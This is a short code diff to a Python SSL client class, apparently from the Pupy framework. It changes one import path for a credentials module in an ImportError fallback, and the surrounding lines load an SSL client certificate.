@@ -162,7 +162,7 @@ class PupySSLClient(PupyTCPClient):
                 self.ROLE = 'CLIENT'
 
             except ImportError:
-                from pupylib.PupyCredentials import Credentials
+                from pupy.pupylib.PupyCredentials import Credentials
 
                 credentials = Credentials()
                 self.SSL_CLIENT_CERT = credentials['SSL_CLIENT_CERT']
